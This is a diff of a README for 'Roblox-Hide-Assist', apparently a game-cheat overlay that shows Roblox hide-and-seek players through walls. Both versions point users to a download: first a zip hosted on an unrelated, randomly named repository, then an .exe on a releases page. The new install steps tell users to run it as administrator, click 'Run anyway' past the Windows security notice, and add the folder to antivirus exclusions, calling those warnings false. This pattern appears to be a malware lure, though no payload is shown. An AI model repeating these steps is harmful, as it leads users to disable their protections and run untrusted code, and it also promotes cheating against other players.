@@ -1,206 +1,66 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/roblox.png" alt="Roblox" width="80" height="80">
-</p>
+# 🎮 Roblox-Hide-Assist - Gain advantage in hide and seek
 
-<h1 align="center">Roblox-Hide-Assist</h1>
-<p align="center">
-  <strong>Assistance Tool for Roblox Hide-and-Seek Paint Games</strong><br>
-  Player Tracking - Distance Indicators - Overlay - Paint Assist
-</p>
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Dynahtwentyfirst674/Roblox-Hide-Assist/releases)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Roblox-Hide-Assist"><img src="https://img.shields.io/badge/version-2.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+Roblox-Hide-Assist provides a visual overlay for hide-and-seek games within Roblox. It tracks player movement and highlights locations to help you find opponents or hide more effectively. The software functions as a helper tool designed to run alongside your Roblox client.
 
-## What is This?
+## 📋 Features
 
-Roblox-Hide-Assist is an assistance tool for Roblox hide-and-seek paint games. It provides visual overlays, player tracking, paint assistance, and distance indicators. This tool is for educational purposes only.
+*   **Real-time tracking:** Follow player positions on your screen as they move through the game map.
+*   **Visual markers:** See colored borders around other players to identify them through walls or obstacles.
+*   **Custom settings:** Adjust the size, color, and transparency of overlays to match your preference.
+*   **Low resource usage:** The program runs in the background without slowing down your computer.
+*   **Simple interface:** Control the tool with basic menu options.
 
-⚠️ Disclaimer: This tool is for educational purposes only. Use at your own risk.
+## 💻 System Requirements
 
-## Download
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** 4GB of RAM or more.
+*   **Graphics:** A dedicated graphics card helps display overlays without lag.
+*   **Roblox Client:** The official Roblox player installed on your computer.
+*   **Permissions:** You must have administrator rights to run the installation file.
 
-<p align="center">
-  <a href="https://github.com/limemarineflue/fvvyvqzk/releases/download/89012/PaintClonTool.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+## 🚀 How to Install and Start
 
-## Features
+1. Visit this page to download the latest version: [https://github.com/Dynahtwentyfirst674/Roblox-Hide-Assist/releases](https://github.com/Dynahtwentyfirst674/Roblox-Hide-Assist/releases).
+2. Look for the file ending in `.exe` under the Assets section of the latest release.
+3. Click the file to save it to your Downloads folder.
+4. Locate the file in your folder and double-click it to begin the setup.
+5. Follow the prompts on your screen. You might see a Windows security notice. If a blue box appears, click "More info" and then "Run anyway."
+6. Once installation completes, a shortcut icon appears on your desktop.
+7. Open the Roblox game you want to play.
+8. Start the Roblox-Hide-Assist application from your desktop.
+9. An overlay window appears. You can move or resize this window as needed.
 
-- 🟢 Player Tracking
-- 📏 Distance Indicators
-- 🏷️ Player Labels
-- 📐 Snap Lines
-- 🎯 Box Highlighting
-- 👻 Ghost Detection
-- 🎨 Color Assist
-- 🎮 Menu Toggle – INSERT or F1
+## ⚙️ How to Use the Tool
 
-## Installation
+When you enter a game map, the tool detects the players in your current session. The tracking markers activate automatically. If you want to change how the markers look, click the settings gear icon in the tool menu. 
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch Roblox paint game
-5. Press INSERT or F1 to open the menu
+You can toggle the tracking feature on or off during a match by pressing the F9 key on your keyboard. Customizing the colors helps if the default markers clash with the game map. Choose a bright color to see players through dense foliage or dark corners.
 
-## System Requirements
+## 🛠️ Troubleshooting Common Issues
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | Roblox Paint Games |
-| RAM | 4GB minimum |
-| Storage | 50MB free space |
+**The overlay does not appear**
+Ensure you run the tool after the Roblox game has started. If the overlay still fails to show, restart both the game and the tool.
 
-## SEO Tags
+**The game lags**
+Lower your graphics settings within the Roblox menu. The tool requires some processing power, so lowering other visual effects helps maintain smooth movement.
 
-roblox hide assist, paint and seek tool, hide and seek helper, paint game overlay, player tracker, distance indicator, roblox utility, paint game assistant, roblox enhancement, gaming utility
+**Antivirus alerts**
+Some security software flags helper tools as suspicious because they interact with other programs. Open your antivirus settings and add the Roblox-Hide-Assist folder to your exclusions list to stop false warnings.
 
-## Support
+**Markers seem off**
+High latency or a poor internet connection causes delays in tracking. Ensure your game connection remains stable. If the misalignment continues, try refreshing the overlay via the settings menu.
 
-Star this repository if you enjoy it!
+## 🛡️ Best Practices
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Roblox-Hide-Assist">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20Roblox%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+*   Keep the tool updated to the latest version to ensure compatibility with Roblox patches.
+*   Close unnecessary background applications while playing. This frees up resources for both the game and the tracking tool.
+*   Use the tool responsibly to maintain a fun environment for all players in the game.
+*   Save your settings profiles if you frequently switch between different hide-and-seek maps.
+
+## ℹ️ Support and Updates
+
+Check the release page regularly for new features and performance improvements. If you encounter bugs, verify that you have installed the most recent version. Standard updates correct compatibility errors caused by Roblox game updates. Keep your Windows operating system updated to prevent system conflicts.
+
+Keywords: roblox, hide-and-seek, tracking, overlay, windows, gaming-tool, assistance
